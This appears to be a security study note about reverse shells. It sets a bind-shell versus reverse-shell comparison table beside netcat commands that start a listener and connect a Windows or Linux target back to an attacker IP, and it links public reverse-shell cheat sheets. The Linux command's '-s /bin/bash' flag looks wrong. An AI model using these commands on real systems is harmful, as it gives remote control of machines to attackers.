

## **Reverse Shell**

A reverse shell or connect-back is a setup, where the attacker must first start the server on his machine, while the target machine will have to act as a client that connects to the server served by the attacker. After the successful connection, the attacker can gain access to the shell of the target computer.

To launch a Reverse shell, the attacker doesn’t need to know the IP address of the victim to access the target computer.


### Difference Between Bind Shell and Reverse Shell

| Bind Shell                                                                                                                                         | Reverse Shell                                                                                                                                                                       |
| -------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Bind Shells have the listener running on the target and the attacker connects to the listener in order to gain remote access to the target system. | In the reverse shell, the attacker has the listener running on his/her machine and the target connects to the attacker with a shell. So that attacker can access the target system. |
| In Bind shell, the attacker finds an open port on the server/ target machine and then tries to bind his shell to that port.                        | In the reverse shell, the attacker opens his own port. So that victim can connect to that port for successful connection.                                                           |
| The attacker must know the IP address of the victim before launching the Bind Shell.                                                               | The attacker doesn’t need to know the [IP address](https://www.geeksforgeeks.org/what-is-an-ip-address/) of the victim, because the attacker is going to connect to our open port.  |
| In Bind shell, the listener is ON on the target machine and the attacker connects to it.                                                           | The Reverse shell is opposite of the Bind Shell, in the reverse shell, the listener is ON on the Attacker machine and the target machine connects to it.                            |
| Bind Shell sometimes will fail, because modern firewalls don’t allow outsiders to connect to open ports.                                           | Reverse Shell can bypass the firewall issues because this target machine tries to connect to the attacker, so the firewall doesn’t bother checking packets.                         |


# **How to create a Reverse Shell:**

#### to get a shell on a Windows target:

1. Setup a listener on our Attacking machine: `nc -nvlp 7777`
2. we need to have nc.exe already there then(<mark style="background: #ABF7F7A6;">But it's possible with other methods</mark>): 

		nc.exe -nv <Attacker_IP> <Attacker_Listening_Port> -e <cmd.exe or powershell.exe>


#### to get a shell on a Linux target:

1. Setup a listener on our Attacking machine: `nc -nvlp 7777`
2. On the Target we need to have netcat already there then (<mark style="background: #ABF7F7A6;">But it's possible with other methods</mark>) 

		nc -nv <Attacker_IP> <Attacker_Listening_Port> -s /bin/bash



# **Reverse Shells without Netcat:**

<mark style="background: #8e44ad;">**:LiGithub:**</mark>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

<mark style="background: #f1c40f;">🔙🐚</mark> https://www.revshells.com/ 
